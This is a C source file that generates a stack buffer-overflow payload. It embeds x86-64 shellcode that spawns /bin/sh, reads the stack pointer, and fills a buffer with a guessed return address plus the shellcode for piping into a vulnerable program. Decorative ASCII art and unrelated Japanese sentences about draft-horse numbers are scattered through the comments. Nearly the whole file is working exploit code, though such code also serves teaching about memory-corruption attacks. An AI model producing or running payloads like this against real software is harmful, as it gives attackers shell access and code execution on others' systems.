// -*- c-file-style: "linux" -*-                           ..
# include                                <sys/types.h>
#  include                                   <stdio.h>
#          include                                      <string.h>
#        include                                      <stdlib.h>
#   include                           <unistd.h> 
////////////////////////////////////////////////////////////////
typedef u_int64_t u64;
////////////////////////////////////////////////////////////////
// * * * 農耕馬（ばん馬）の数は2015 * * * * * 年に1100頭ほどと20年前に
const char shellcode[] = 
/* ;;;;     */ "\xEB\x10"
/* ;;;;;;   */ "\x5F"
/* ;;;;;;;; */ "\x48\x31\xC0"
/*  ;;      */ "\x50"
/* ;;;;;;   */ "\x57"
/*  ;;;;    */ "\x48\x89\xE6"
/*     ;;;; */ "\x48\x89\xC2"
/*  ;;      */ "\xB0\x3B"
/* ;;;;;    */ "\x0F\x05"
/* ;;;;;;   */ "\xE8\xEB\xFF\xFF\xFF"
/* ;;;;;;;; */ "/bin/sh";
////////////////////////////////////////////////////////////////
// 比べて7分の1に * * * * * * * * * * * * * * * * * * * * * * * * 
u64 getrsp() { // ,________________________      _______________
        u64 rsp;                 // > > > > >          > > > > >
        asm( "mov %%rsp, %0\n\t" //  -------------        ------
             "// next: chill"    //=============================
             : "=r" ( rsp ));    //__________       ____________
        return rsp; //------------------   -------------      --       
} // , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
/////////////////////////////\/\/\/\////////////////////////////
int main( int argc, char *argv[] ){
        if( argc < 3 ){
                return !printf( "rsp: %p\n", ( void* )getrsp());
        }
        off_t      off = atoi( argv[ 1 ]);
        size_t     len = atoi( argv[ 2 ]);
        u64 theSubject = getrsp() - off;
        fprintf( stderr, "subj: 0x%016lx\n", theSubject );
                                       // ʾ  ʿ  ˀ  ˁ  ˈ  ˟  ˠ  ˡ ˢ ˣ ˤ
                                       // +---+---+---+___+---+
                                       // '   '   '   ,   |   |
                                       // *---*---+```+___+___+
                                       // ,   '   |   .   |   ¦
                                       // *---+---*===o---+---*
                                       // ʷ   ʸ   ʹ   ʺ   ʻ   ʼ   ʽ   
                                       // ʰ   ʱ    ʲ   ʳ   ʴ   ʵ   ʶ
        u_char *bufr = calloc( len, sizeof( u_char ));
        int n = len / sizeof( u64 );
        for( int j = 0; j < n; j++ ){
                ((u64 *)bufr)[ j ] = theSubject;
        }
        memcpy( bufr, shellcode, strlen( shellcode ));
        write( 1, bufr, n*sizeof( u64 ));
}
////////////////////////////////////////////////////////////////
// T h e                                               
//       
//                 V   ^   ˄  ˅     ˆ      ˇ
//
//                                                     S o u t h
